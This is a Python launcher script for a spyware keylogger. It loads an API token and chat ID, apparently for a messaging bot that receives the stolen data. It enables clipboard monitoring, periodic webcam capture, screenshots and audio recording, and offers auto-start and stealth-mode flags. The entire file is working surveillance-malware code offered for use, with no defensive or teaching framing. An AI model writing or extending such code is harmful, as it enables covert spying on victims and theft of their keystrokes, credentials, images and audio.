import os
from dotenv import load_dotenv
from keylogger import Keylogger

def main():
    load_dotenv()  # Load environment variables from .env file

    API_TOKEN = os.getenv("API_TOKEN")
    CHAT_ID = os.getenv("CHAT_ID")
    ENABLE_CLIPBOARD_MONITOR = True
    ENABLE_WEBCAM = True
    ENABLE_SCREENSHOT = True
    ENABLE_AUDIO_RECORDING = True
    AUDIO_RECORDING_INTERVAL = 30
    WEBCAM_INTERVAL = 600  # seconds
    SCREENSHOT_INTERVAL = 600  # seconds
    AUTO_START = False
    STEALTH_MODE = False

    keylogger = Keylogger(
        api_token=API_TOKEN,
        chat_id=CHAT_ID,
        enable_clipboard=ENABLE_CLIPBOARD_MONITOR,
        enable_webcam=ENABLE_WEBCAM,
        enable_screenshot=ENABLE_SCREENSHOT,
        enable_audio=ENABLE_AUDIO_RECORDING,
        audio_interval=AUDIO_RECORDING_INTERVAL,
        webcam_interval=WEBCAM_INTERVAL,
        screenshot_interval=SCREENSHOT_INTERVAL,
        auto_start=AUTO_START,
        stealth_mode=STEALTH_MODE
    )
    keylogger.start()

if __name__ == "__main__":
    main()
